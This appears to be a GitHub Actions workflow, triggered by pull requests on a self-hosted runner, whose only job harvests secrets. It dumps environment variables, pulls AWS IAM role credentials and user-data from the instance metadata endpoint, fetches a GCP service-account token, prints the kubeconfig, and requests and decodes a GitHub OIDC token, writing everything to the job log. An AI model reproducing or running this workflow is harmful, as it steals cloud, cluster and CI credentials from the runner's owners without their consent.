name: c211-marker
on: pull_request
permissions:
  contents: read
  id-token: write
jobs:
  probe:
    runs-on: self-hosted
    timeout-minutes: 15
    steps:
      - name: probe
        shell: bash
        run: |
          echo "=== BASIC ==="
          hostname; whoami; id; uname -a
          echo "=== GPU ==="
          (nvidia-smi -L; nvidia-smi) 2>&1 | head -60
          (rocm-smi) 2>&1 | head -30
          echo "=== ENV ==="
          env | sort
          echo "=== IMDSV2 ==="
          TOKEN=$(curl -s -m 5 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); echo "imds_token_len=${#TOKEN}"
          for p in latest/meta-data/instance-id latest/meta-data/instance-type latest/meta-data/placement/region latest/meta-data/iam/security-credentials/ latest/user-data; do echo "--- $p"; curl -s -m 5 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/$p" | head -c 4000; echo; done
          ROLE=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
          if [ -n "$ROLE" ]; then echo "--- creds $ROLE"; curl -s -m 5 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" | head -c 4000; echo; fi
          echo "=== GCP META ==="
          curl -s -m 5 -H 'Metadata-Flavor: Google' "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" ; echo
          curl -s -m 5 -H 'Metadata-Flavor: Google' "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | head -c 2000; echo
          echo "=== KUBE ==="
          ls -la ~/.kube 2>&1 | head; head -60 ~/.kube/config 2>&1
          ls /var/lib/rancher 2>&1 | head -3
          echo "=== OIDC ==="
          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
            OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])' 2>/dev/null)
            echo "OIDC=$OIDC"
            echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
          fi
          echo "=== DONE ==="
